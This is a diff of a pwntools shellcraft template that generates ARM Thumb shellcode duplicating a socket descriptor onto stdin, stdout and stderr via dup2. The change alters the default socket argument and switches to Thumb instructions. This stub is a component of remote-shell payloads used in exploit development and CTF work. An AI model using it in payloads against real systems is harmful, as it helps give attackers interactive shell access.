@@ -1,8 +1,8 @@
 <% from pwnlib.shellcraft import arm, common %>
 <% from pwnlib.asm import cpp %>
-<%page args="sock = 'r9'"/>
+<%page args="sock = 4"/>
 <%docstring>
-	Args: [sock (imm/reg) = r9]
+	Args: [sock (int/str) = default: 4]
 	Duplicates sock to stdin, stdout and stderr in thumb mode
 </%docstring>
 <%
@@ -10,15 +10,15 @@
 	looplabel = common.label("loop")
 %>
 
-${arm.arm_to_thumb()}
-
-	mov r1, #3
-	mov r7, ${cpp("SYS_dup2", arch = "thumb", os = "linux")}
-	sub r2, r2, r2
+	.thumb
+${dup}:
+	movs r1, #3
+	movs r7, ${cpp("SYS_dup2", arch = "thumb", os = "linux")}
+	subs r2, r2, r2
 
 ${looplabel}:
-	mov r0, ${sock}
-	sub r1, r1, #1
+	movs r0, ${sock}
+	subs r1, r1, #1
 	svc 1
 	cmp r1, r2
 	bne ${looplabel}
